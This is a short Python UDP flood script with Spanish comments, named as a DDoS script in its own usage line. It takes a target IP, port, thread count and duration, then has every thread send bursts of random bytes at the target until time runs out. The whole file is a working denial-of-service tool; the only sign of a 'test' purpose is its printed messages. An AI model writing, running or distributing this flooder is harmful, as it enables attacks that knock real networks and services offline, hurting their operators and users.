import socket
import random
import threading
import sys
import time

#comandos
#Ej: python3 ddos_script.py 192.168.0.105 32400 15 1
#1 ingreso IP
#2 ingreso puerto
#3 ingreso cantidad de hilos de trabajo
#4 ingreso tiempo de trabajo en minutos

try:
    target = str(sys.argv[1])
    dport = int(sys.argv[2])
    threads = sys.argv[3]
    timer = sys.argv[4]

    print(target)
    print(dport)
    print(threads)
    print(str(timer))

    #timeout = (time.time() + 1) * float(timer)
    timeout = time.time() + (float(timer) * 60)
    print(timeout)

except IndexError:
    print('\n + Command used: python ' + sys.argv[0] +  '<target> <threads> <time>')
    sys.exit

def attack():
    try:
        cantidad_ataques = 0;

        bytes = random._urandom(1024)
        #print(bytes)

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        #print(sock)
        
        while time.time() < timeout:
            print("-")
            print(str(time.time())+"-"+ str(timeout)+"-")
            
            #dport = random.randint(20, 55500)
            
            cantidad_ataques += 1

            sock.sendto(bytes*random.randint(5,15),(target, dport))
        
        print(">>>>>>>>>>>>>>>>>>>>>>>" + str(cantidad_ataques))

        sys.exit()            
        return None

    except:
        pass          


print('+ Starting test ....')

#con hilos
for x in range(0, int(threads)):
    threading.Thread(target=attack).start()

#simple
#attack()

print('\n + Test finished Done.')    
